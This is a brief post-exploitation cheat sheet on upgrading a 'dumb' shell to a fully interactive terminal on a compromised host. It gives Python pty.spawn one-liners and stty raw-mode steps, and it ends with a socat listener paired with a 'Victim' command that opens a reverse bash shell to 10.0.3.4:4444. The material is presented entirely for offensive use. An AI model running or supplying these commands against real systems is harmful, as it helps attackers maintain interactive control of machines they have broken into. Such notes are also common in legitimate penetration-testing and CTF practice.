#######
# Upgrade a dumb shell to partial interactive
#######

# Python 2 
    python -c 'import pty; pty.spawn("/bin/bash")'  
# Python 3
    python3 -c 'import pty; pty.spawn("/bin/bash")'


#######
# Upgrade partial to full TTY
#######

# get your current terminal size (rows and columns)
stty size

# for bash/sh (enter raw mode and disable echo'ing)
stty raw -echo
fg

# for zsh (enter raw mode and disable echo'ing)
stty raw -echo; fg

reset
export SHELL=bash
export TERM=xterm
stty rows <num> columns <cols>   # <num> and <cols> values found above by 'stty size'


#######
# socat full TTY
#######

# SOCAT (Full TTY)
    # Listener
    socat file:`tty`,raw,echo=0 tcp-listen:4444
    # Victim
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
